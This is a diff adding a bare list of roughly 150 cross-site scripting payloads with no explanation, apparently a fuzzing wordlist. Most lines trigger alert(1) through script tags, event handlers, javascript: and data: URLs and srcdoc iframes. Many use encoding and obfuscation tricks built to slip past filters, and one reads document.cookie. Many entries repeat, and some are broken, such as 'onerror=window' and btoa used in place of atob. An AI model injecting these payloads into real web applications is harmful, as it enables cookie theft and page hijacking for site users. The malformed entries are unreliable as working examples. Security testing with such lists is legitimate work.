@@ -1,0 +1,153 @@
+<script>alert(1)</script>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert(1)>
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+<body onload=alert(1)>
+<img src="javascript:alert(1)">
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+<script>document.write('<img src=x onerror=alert(1)>')</script>
+<img src=x onerror="javascript:alert(1)">
+<svg><script>alert(1)</script></svg>
+<form><input onfocus="alert(1)" autofocus></form>
+<math><mtext><script>alert(1)</script></mtext></math>
+<style>@import "javascript:alert(1)"</style>
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<link rel="stylesheet" href="javascript:alert(1)">
+<base href="javascript:alert(1)//">
+<textarea onfocus="alert(1)" autofocus>content</textarea>
+<script>var s='al'+'ert(1)'; eval(s);</script>
+<img src=x onerror=window>
+<svg onload=eval('&#x61;&#x6C;&#x65;&#x72;&#x74;(1)')>
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe> (base64 of <script>alert(1)</script>)
+<script>document.write('<img src=x onerror=alert(1)>')</script>
+<script>location='javascript:alert(1)';</script>
+<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+<iframe srcdoc="<img src=x onerror=window>"></iframe>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<img src=x onerror=setTimeout('al'+'ert(1)',0)>
+<svg onload=alert(String.fromCharCode(88,83,83))>
+<iframe srcdoc="<svg onload=eval('ale'+'rt(1)')>"></iframe>
+<script>alert(1)</script>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert(1)>
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+<body onload=alert(1)>
+<img src="javascript:alert(1)">
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+<script>var s='al'+'ert(1)'; eval(s);</script>
+<img src=x onerror=window >
+<svg onload=eval('&#x61;&#x6C;&#x65;&#x72;&#x74;(1)')>
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
+<script>document.write('<img src=x onerror=alert(1)>')</script>
+<script>location='javascript:alert(1)';</script>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<img src=x onerror=setTimeout('al'+'ert(1)',0)>
+"><svg/onload=alert(1)>
+<img src=x onerror=alert(document.cookie)>
+<iframe srcdoc="<img src=x onerror=eval(atob('YWxlcnQoMSk='))>"></iframe>
+<iframe srcdoc="<svg onload=eval('ale'+'rt(1)')>"></iframe>
+<img src=x onerror=eval(decodeURIComponent('%61%6c%65%72%74%281%29'))>
+<svg onload=eval(unescape('%61%6c%65%72%74(1)'))>
+<script>new Function(atob('YWxlcnQoMSk='))()</script>
+<img src=x onerror=eval('al'.concat('ert(1)'))>
+"><img src=x onerror=alert(1)>
+"><img onerror=alert(1) src=1>
+<video><source onerror="alert(1)"></video>
+<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<img src=x onerror="(function(){alert(1)})();">
+<iframe srcdoc="<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>"></iframe>
+<svg><script>alert(1)</script></svg>
+<img src=x onerror="this.onerror=null;alert(1)">
+<svg onload=alert(String.fromCharCode(49))>
+"><input autofocus onfocus=alert(1)>
+<table background="javascript:alert(1)"></table>
+"><iframe srcdoc='<img src=x onerror=alert(1)>'></iframe>
+<img srcset="x" onerror=alert(1)>
+<svg onload=eval(decodeURIComponent('%61%6c%65%72%74(1)'))>
+<script>setTimeout("alert(1)",0)</script>
+<iframe src="javascript:parent.alert(1)"></iframe>
+"><svg onload=location='javascript:alert(1)'>
+<img src=x onerror=Function('alert(1)')()>
+<svg><foreignObject><body onload=alert(1)></body></foreignObject></svg>
+<script>var a=String.fromCharCode(97,108,101,114,116); eval(a+'(1)');</script>
+<iframe srcdoc="<script>document.write(atob('PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='))</script>"></iframe>
+<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+"><svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+<img src=x onerror="window "/>
+<iframe srcdoc='<svg onload=alert(1)></svg>'></iframe>
+<img src=x onerror='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'>
+<svg onload='new Function(atob("YWxlcnQoMSk="))()'>
+<iframe srcdoc="<img src=x onerror=window >"></iframe>
+<body onload=eval('alert(1)')>
+<img src=x onerror=document.location='javascript:alert(1)'>
+<script>document.createElement('img').src='x' ; document.body.appendChild(img); img.onerror=alert(1);</script>
+<svg onload="setTimeout('alert(1)',0)"></svg>
+"><script>/*--></script><script>alert(1)</script>
+<img src=x onerror='/*\n*/alert(1)'>
+<svg onload=window['al'+'ert']('XSS')>
+<link rel="stylesheet" href="javascript:alert(1)">
+<iframe srcdoc="%3Cscript%3Ealert(1)%3C%2Fscript%3E"></iframe>
+<svg onload=eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,0x28,0x31,0x29))>
+<script>document.body.innerHTML = unescape('%3Cimg src=x onerror=alert(1)%3E')</script>
+<details open ontoggle='[1].find(Function(atob("YWxlcnQoMSk=")))()'>
+<img src='x' onerror='Function`alert(1)``'>
+<svg onload='Function.prototype.constructor("alert(1)")()'>
+<embed src='x' onabort='Function.prototype.constructor(atob("YWxlcnQoMSk="))()'>
+<select onchange='(function(){return Function("alert(1)")})()'>
+<details open ontoggle='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'></details>
+<svg onload='Function`window.alert(1)`()'></svg>
+<body onpageshow='eval(atob("YWxlcnQoMSk="))'></body>
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+<img src=x onerror='Function`alert(1)`()'></img>
+<embed src='x' onload='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'></embed>
+<details open ontoggle='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'></details>
+<iframe srcdoc='&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;'></iframe>
+<svg onload='Function("alert(1)")()'>
+<video src=x onerror='Function`alert(1)``'></video>
+<object data='data:text/html,<script>alert(1)</script>'></object>
+<style onload='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'></style>
+<input type=image src=x onerror='eval(atob("YWxlcnQoMSk="))'></input>
+<audio src=x onerror='Function("alert(1)")()'>
+<embed src='data:text/html,<script>alert(1)</script>'></embed>
+<image src=x onerror='Function`alert(1)``'></image>
+<select onchange='Function("alert(1)")()'>
+<iframe srcdoc='&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;'></iframe>
+<body onload='prompt`1`'></body>
+<video src=x onerror='Function("alert(1)")()'>
+<img src=x onerror='Function`alert(1)`'>
+<input type=image src=x onload='eval(decodeURI("%61%6C%65%72%74%28%31%29"))'>
+<style onload='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'>x</style>
+<audio src=x onerror='eval(decodeURIComponent("%61%6C%65%72%74%28%31%29"))'>
+<base href="javascript:alert(1)">
+<iframe srcdoc='&#x3c;img src=x onerror=alert(1)&#x3e;'>
+<details open ontoggle='eval(atob("YWxlcnQoMSk="))'></details>
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+<img src=x onerror="Function`alert(1)`()"></img>
+<body onload="eval(decodeURIComponent('%61%6C%65%72%74%28%31%29'))"></body>
+<style>body{background:url("javascript:alert(1)")}</style>
+<script>Function`alert(1)`()</script>
+<input type="image" src=x onerror="Function('alert(1)')()">
+<base href="javascript:alert(1)">
+<details open ontoggle="eval(String.fromCharCode(97,108,101,114,116,40,49,41))"></details>
+<iframe srcdoc="&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;"></iframe>
+<svg onload="&#x70;rompt`1`"></svg>
+<video src="x" onerror="eval(decodeURIComponent('%61%6C%65%72%74%28%31%29'))"></video>
+<img src="x" onerror="Function`alert(1)`()"></img>
+<body onload="eval(atob('YWxlcnQoMSk='))"></body>
+<table background="javascript:alert(1)"></table>
+<audio src="x" onerror="eval(btoa('YWxlcnQoMSk=').replace(/[a-zA-Z]/g,''))"></audio>
+<style>@import "javascript:alert(1)";</style>
+<base href="javascript:alert(1)">
+<link rel="stylesheet" href="javascript:alert(1)">
+<details open ontoggle='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'></details>
+<video poster=x onerror=eval(btoa('alert(1)'.split('').reverse().join('')))></video>
+<input type=image src=x onerror=eval(atob`YWxlcnQoMSk=`)>
+<object data="data:text/html,<script>alert(1)</script>"></object>
+<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
+<audio src=x onerror=eval(btoa('1').replace(/\d/,`alert`))></audio>
